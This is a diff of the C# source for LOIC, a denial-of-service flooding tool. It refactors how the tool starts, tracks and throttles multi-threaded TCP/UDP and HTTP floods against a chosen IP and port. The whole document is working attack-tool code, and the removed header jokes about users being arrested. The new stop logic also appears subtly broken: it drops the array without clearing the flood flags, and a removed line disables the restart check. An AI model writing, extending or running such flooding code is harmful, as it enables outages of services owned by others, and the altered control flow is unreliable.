@@ -1,9 +1,5 @@
-﻿/* LOIC - Low Orbit Ion Cannon
- * Released to the public domain
- * Enjoy getting v&, kids.
- */
-
-using System;
+﻿using System;
+using System.Linq;
 using System.Net;
 using System.Windows.Forms;
 using System.Globalization;
@@ -14,8 +10,7 @@ namespace LOIC
 	{
 		#region Fields
 		private bool attack;
-		private static XXPFlooder[] xxp;
-		private static HTTPFlooder[] http;
+		private static IFlooder[] arr;
 
 		private static string sIP, sData, sSubsite;
 		private static int iPort, iThreads, iProtocol, iDelay, iTimeout;
@@ -102,6 +97,8 @@ namespace LOIC
 
 					if (!txtSubsite.Text.StartsWith("/") && (iProtocol == 3))
 						throw new Exception("You have to enter a subsite (for example \"/\")");
+					else
+						sSubsite = txtSubsite.Text;
 
 					if (!Int32.TryParse(txtTimeout.Text, out iTimeout))
 						throw new Exception("What's up with something like that in the timeout box? =S");
@@ -123,20 +120,20 @@ namespace LOIC
 
 				if (iProtocol == 1 || iProtocol == 2)
 				{
-					xxp = new XXPFlooder[iThreads];
-					for (int a = 0; a < xxp.Length; a++)
+					arr = new XXPFlooder[iThreads];
+					for (int a = 0; a < arr.Length; a++)
 					{
-						xxp[a] = new XXPFlooder(sIP, iPort, iProtocol, iDelay, bResp, sData);
-						xxp[a].Start();
+						arr[a] = new XXPFlooder(sIP, iPort, iProtocol, iDelay, bResp, sData);
+						arr[a].Start();
 					}
 				}
 				else if (iProtocol == 3)
 				{
-					http = new HTTPFlooder[iThreads];
-					for (int a = 0; a < http.Length; a++)
+					arr = new HTTPFlooder[iThreads];
+					for (int a = 0; a < arr.Length; a++)
 					{
-						http[a] = new HTTPFlooder(sIP, iPort, sSubsite, bResp, iDelay, iTimeout);
-						http[a].Start();
+						arr[a] = new HTTPFlooder(sIP, iPort, sSubsite, bResp, iDelay, iTimeout);
+						arr[a].Start();
 					}
 				}
 
@@ -146,21 +143,8 @@ namespace LOIC
 			{
 				attack = false;
 				cmdAttack.Text = "IMMA CHARGIN MAH LAZER";
-				if (xxp != null)
-				{
-					for (int a = 0; a < xxp.Length; a++)
-					{
-						xxp[a].IsFlooding = false;
-					}
-				}
-				if (http != null)
-				{
-					for (int a = 0; a < http.Length; a++)
-					{
-						http[a].IsFlooding = false;
-					}
-				}
 				tShowStats.Stop();
+				arr = null;
 			}
 		}
 
@@ -169,14 +153,9 @@ namespace LOIC
 			if (intShowStats) return; intShowStats = true;
 
 			bool isFlooding = false;
-			if (cmdAttack.Text == "Stop for now") isFlooding = true;
 			if (iProtocol == 1 || iProtocol == 2)
 			{
-				int iFloodCount = 0;
-				for (int a = 0; a < xxp.Length; a++)
-				{
-					iFloodCount += xxp[a].FloodCount;
-				}
+				int iFloodCount = arr.Cast<XXPFlooder>().Sum(f => f.FloodCount);
 				lbRequested.Text = iFloodCount.ToString(CultureInfo.InvariantCulture);
 			}
 			if (iProtocol == 3)
@@ -189,16 +168,36 @@ namespace LOIC
 				int iRequested = 0;
 				int iFailed = 0;
 
-				for (int a = 0; a < http.Length; a++)
+				for (int a = 0; a < arr.Length; a++)
 				{
-					var httpFlooder = http[a];
+					HTTPFlooder httpFlooder = (HTTPFlooder)arr[a];
 					iDownloaded += httpFlooder.Downloaded;
 					iRequested += httpFlooder.Requested;
 					iFailed += httpFlooder.Failed;
-					if (httpFlooder.State == ReqState.Ready || http[a].State == ReqState.Completed) iIdle++;
-					if (httpFlooder.State == ReqState.Connecting) iConnecting++;
-					if (httpFlooder.State == ReqState.Requesting) iRequesting++;
-					if (httpFlooder.State == ReqState.Downloading) iDownloading++;
+					switch (httpFlooder.State)
+					{
+						case ReqState.Ready:
+						case ReqState.Completed:
+							{
+								iIdle++;
+								break;
+							}
+						case ReqState.Connecting:
+							{
+								iConnecting++;
+								break;
+							}
+						case ReqState.Requesting:
+							{
+								iRequesting++;
+								break;
+							}
+						case ReqState.Downloading:
+							{
+								iDownloading++;
+								break;
+							}
+					}
 					if (isFlooding && !httpFlooder.IsFlooding)
 					{
 						int iaDownloaded = httpFlooder.Downloaded;
@@ -211,7 +210,7 @@ namespace LOIC
 							Failed = iaFailed
 						};
 						httpFlooder.Start();
-						http[a] = httpFlooder;
+						arr[a] = httpFlooder;
 					}
 				}
 				lbFailed.Text = iFailed.ToString(CultureInfo.InvariantCulture);
@@ -229,18 +228,11 @@ namespace LOIC
 		private void tbSpeed_ValueChanged(object sender, EventArgs e)
 		{
 			iDelay = tbSpeed.Value;
-			if (http != null)
+			if (arr != null)
 			{
-				for (int a = 0; a < http.Length; a++)
+				foreach (var f in arr)
 				{
-					if (http[a] != null) http[a].Delay = iDelay;
-				}
-			}
-			if (xxp != null)
-			{
-				for (int a = 0; a < xxp.Length; a++)
-				{
-					if (xxp[a] != null) xxp[a].Delay = iDelay;
+					f.Delay = iDelay;
 				}
 			}
 		}
